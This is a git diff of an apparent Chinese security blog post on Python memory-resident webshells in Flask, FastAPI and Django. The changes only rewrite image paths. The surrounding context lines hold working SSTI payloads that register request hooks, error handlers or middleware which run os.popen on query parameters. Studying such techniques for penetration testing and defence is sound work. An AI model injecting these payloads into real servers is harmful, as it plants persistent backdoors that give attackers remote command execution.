@@ -80,7 +80,7 @@ app.view_functions['shell3'] = shell
 
 只能找其他的方式
 
-![image-20260929173638865](/images/python-memshell/image-20260929173638865.png)
+![image-20260929173638865](/Levi38_blog/images/python-memshell/image-20260929173638865.png)
 
 ## 装饰器型/钩子内存马（或者叫中间件）
 
@@ -88,13 +88,13 @@ app.view_functions['shell3'] = shell
 
 ### before_request
 
-![img](/images/python-memshell/3181170-20240509130843333-1796050029.png)
+![img](/Levi38_blog/images/python-memshell/3181170-20240509130843333-1796050029.png)
 
 这个装饰器使得每次在发送请求时都会执行绑定的函数
 
 我们跟进这个before_request
 
-![img](/images/python-memshell/3181170-20240509130854801-296609756.png)
+![img](/Levi38_blog/images/python-memshell/3181170-20240509130854801-296609756.png)
 
 
 发现他自己调用了一个before_request_funcs.setdefault(None, []).append(f)
@@ -107,7 +107,7 @@ eval("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs
 
 访问**该站点下的任意 URL**，带上参数 `?cmd=whoami` 即可执行命令
 
-![image-20260929211528467](/images/python-memshell/image-20260929211528467.png)
+![image-20260929211528467](/Levi38_blog/images/python-memshell/image-20260929211528467.png)
 
 **app.before_request_funcs**
 
@@ -129,7 +129,7 @@ ssti时payload可以这样写
 
 或者把url_for换成下列变量
 
-![image-20260929210828887](/images/python-memshell/image-20260929210828867.png)
+![image-20260929210828887](/Levi38_blog/images/python-memshell/image-20260929210828867.png)
 
 ### after_request
 
@@ -143,7 +143,7 @@ ssti中的payload
 {{ url_for.__globals__['__builtins__']['eval']('__import__("sys").modules["__main__"].__dict__["app"].after_request_funcs.setdefault(None,[]).append(lambda resp: __import__("flask").make_response(__import__("os").popen(__import__("flask").request.args.get("cmdd")).read()) if __import__("flask").request.args.get("cmdd") else resp)') }}
 ```
 
-![image-20260929212444516](/images/python-memshell/image-20260929212444516.png)
+![image-20260929212444516](/Levi38_blog/images/python-memshell/image-20260929212444516.png)
 
 **为什么不像before_request一样直接在append后跟函数**
 
@@ -176,7 +176,7 @@ ssti版本
 {{ url_for.__globals__['__builtins__']['exec']('import sys;app=sys.modules["__main__"].__dict__["app"];exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec.setdefault(None,{}).setdefault(code,{})[exc_class]=lambda a:__import__("os").popen(__import__("flask").request.args.get("levi")).read()', {})}}
 ```
 
-![image-20260929213946189](/images/python-memshell/image-20260929213946189.png)
+![image-20260929213946189](/Levi38_blog/images/python-memshell/image-20260929213946189.png)
 
 ```
 {{ url_for.__globals__['__builtins__']['exec']('import sys;app=sys.modules["__main__"].__dict__["app"];app.errorhandler(404)(lambda a:__import__("os").popen(__import__("flask").request.args.get("cmd4")).read())', {}) }}
@@ -378,18 +378,18 @@ if __name__ == "__main__":
 uvicorn main:app --reload --port 9000
 ```
 
-![image-20261009111622955](/images/python-memshell/image-20261009111622955.png)
+![image-20261009111622955](/Levi38_blog/images/python-memshell/image-20261009111622955.png)
 
-带路由和查询参数的访问![image-20261009111931767](/images/python-memshell/image-20261009111931767.png)
+带路由和查询参数的访问![image-20261009111931767](/Levi38_blog/images/python-memshell/image-20261009111931767.png)
 
 FastAPI 会自动生成 API 文档，可以通过以下 URL 访问：
 
 - **自动生成的文档**: `http://localhost:9000/docs`
 - **原始文档**: `http://localhost:9000/redoc`
 
-![image-20261009112025039](/images/python-memshell/image-20261009112025039.png)
+![image-20261009112025039](/Levi38_blog/images/python-memshell/image-20261009112025039.png)
 
-![image-20261009112104663](/images/python-memshell/image-20261009112104663.png)
+![image-20261009112104663](/Levi38_blog/images/python-memshell/image-20261009112104663.png)
 
 ## SSTI下的利用
 
@@ -419,7 +419,7 @@ if __name__ == "__main__":
 
 在FastAPI中 add_api_route函数可用于添加路由
 
-![image-20261010222906468](/images/python-memshell/image-20261010222906468.png)
+![image-20261010222906468](/Levi38_blog/images/python-memshell/image-20261010222906468.png)
 
 这里一开始用
 
@@ -457,7 +457,7 @@ lipsum.__globals__['__builtins__']['eval'](
 
 
 
-![image-20261010230118438](/images/python-memshell/image-20261010230118438.png)
+![image-20261010230118438](/Levi38_blog/images/python-memshell/image-20261010230118438.png)
 
 ### 异常处理器
 
@@ -515,7 +515,7 @@ app.user_middleware.insert(0,app.__init__.__globals__['Middleware'](
 )}}
 ```
 
-![image-20261010235949361](/images/python-memshell/image-20261010235949361.png)
+![image-20261010235949361](/Levi38_blog/images/python-memshell/image-20261010235949361.png)
 
 ## pickle 下的利用
 
@@ -705,7 +705,7 @@ __import__('django.urls.resolvers',fromlist=['_get_cached_resolver'])._get_cache
 
 `  m=__import__('demo.urls',fromlist=['urlpatterns'])`
 
-` __import__` 导入 `demo.urls`（就是 settings.py 里 ROOT_URLCONF 指的那个文件，所有路由都注册在这）![image-20261011195002397](/images/python-memshell/image-20261011195002397.png)
+` __import__` 导入 `demo.urls`（就是 settings.py 里 ROOT_URLCONF 指的那个文件，所有路由都注册在这）![image-20261011195002397](/Levi38_blog/images/python-memshell/image-20261011195002397.png)
 
 fromlist=['urlpatterns']  不加的话 `__import__('demo.urls')` 会只返回顶层的demo 包
 
@@ -727,7 +727,7 @@ m.urlpatterns.append(
  Django 5 及以下缓存的函数叫 get_resolver，所以老文章里写的是 get_resolver.cache_clear()；Django 6 改名成了
   _get_cached_resolver，这行是对新版本的适配
 
-![image-20261011194501962](/images/python-memshell/image-20261011194501962.png)
+![image-20261011194501962](/Levi38_blog/images/python-memshell/image-20261011194501962.png)
 
 ```
 # 版本通用的清缓存写法（哪个带 lru_cache 就清哪个）
@@ -762,7 +762,7 @@ m.handler404 = handler404"
 
 注入后任意不存在的路径都是 webshell
 
-![image-20261011195537491](/images/python-memshell/image-20261011195537491.png)
+![image-20261011195537491](/Levi38_blog/images/python-memshell/image-20261011195537491.png)
 
 需要注意settings.py中**必须设置 `DEBUG = False`**，DEBUG 模式下 404 走 `technical_404_response` 调试页面，不会查 handler404
 
